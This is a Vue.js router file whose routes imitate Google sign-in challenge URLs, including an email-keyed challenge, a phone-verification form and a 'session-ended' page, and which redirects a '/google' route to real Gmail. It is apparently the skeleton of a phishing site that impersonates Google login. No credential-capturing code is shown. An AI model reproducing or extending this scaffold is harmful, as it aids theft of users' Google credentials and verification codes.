import Vue from 'vue';
import VueRouter from 'vue-router';
import Home from '../views/Home.vue';
Vue.use(VueRouter);

const routes = [
  {
    path: '/signin/v2/challenge/:email',
    name: 'Home',
    component: Home,
  },
  {
    path: '/signin/v2/challenge/ipp/:email',
    name: 'PhoneVerificationForm',
    component: () =>
      import(
        /* webpackChunkName: "PhoneVerificationForm" */ '../views/PhoneVerificationForm.vue'
      ),
  },
  {
    path: '/signin/v2/session-ended',
    name: 'SessionEnded',
    component: () =>
      import(
        /* webpackChunkName: "SessionEnded" */ '../views/SessionEnded.vue'
      ),
  },

  {
    path: '/document-not-found',
    name: 'DocumentNotFound',
    component: () =>
      import(/* webpackChunkName: "about" */ '../views/DocumentNotFound.vue'),
  },
  {
    path: '/not-listed',
    name: 'NotListed',
    component: () =>
      import(/* webpackChunkName: "about" */ '../views/NotListed.vue'),
  },
  {
    path: '/success',
    name: 'success',
    component: () =>
      import(/* webpackChunkName: "about" */ '../views/success.vue'),
  },
  {
    path: '/google',
    name: 'google',
    beforeEnter() {
      location.href = 'https://mail.google.com';
    },
    component: () =>
      import(/* webpackChunkName: "about" */ '../views/success.vue'),
  },
];

const router = new VueRouter({
  routes,
});

export default router;
